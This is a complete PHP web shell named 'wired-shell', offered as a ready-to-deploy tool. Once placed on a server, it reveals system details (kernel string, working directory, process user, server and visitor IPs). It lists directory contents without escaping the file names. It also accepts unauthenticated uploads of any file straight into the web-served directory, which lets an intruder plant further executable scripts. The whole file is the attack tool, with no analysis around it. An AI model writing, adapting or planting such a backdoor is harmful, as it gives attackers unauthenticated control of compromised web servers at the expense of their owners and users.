<?php
$message = '';
$target_dir = getcwd() . '/';
$files = scandir($target_dir);

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $target_file = basename($_FILES['file']['name']);
    $target_path = $target_dir . $target_file;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_path)) {
        $message = "<div>File uploaded successfully: " . htmlspecialchars($target_path) . "</div>";
    } else {
        $message = "<div>Error uploading file.</div>";
    }
}
?>
<!DOCTYPE html>
<html>

<head>
    <title>wired-shell</title>
    <style type='text/css'>
        body {
            font-family: 'Inter', sans-serif;
            display: flex;
            min-height: 100vh;
            margin: 0;
            background: #0f0f0f;
            color: #fff;
            font-size: 12px;
        }

        .container {
            display: flex;
            flex-direction: column;
            border: 2px solid #D77189;
            padding: 1.5rem;
            border-radius: 0.5rem;
            position: relative;
            width: 100%;
        }

        .header {}

        hr {
            margin: 1.5rem 0rem 1.5rem 0rem;
            border: 1px solid #D77189;
            display: flex;
            width: 100%;
        }
    </style>
</head>

<body>
    <div class='container'>
        <div class='header'>
            <?php echo php_uname() . "<br />Directory: " . getcwd() . "<br />User: " . get_current_user() . "<br />User IP: " . $_SERVER['REMOTE_ADDR'] . "<br />Server IP : " . gethostbyname($_SERVER['HTTP_HOST']); ?>
        </div>
        <hr>
        <div id="file_upload">
            <form method="POST" enctype="multipart/form-data">
                <h2>File Upload</h2>
                <input type="file" name="file" required>
                <button type="submit">Upload</button>
            </form>
            <div><?php echo $message; ?></div>
        </div>
        <div id="scan_dir">
            <h3>Directory <?php echo getcwd(); ?></h3>
            <?php foreach ($files as $file) {
                echo '<span>' . $file . '<span/><br>';
            } ?>
        </div>
        <hr>

        <div class='footer'>🄯 copyleft wired-shell</div>
    </div>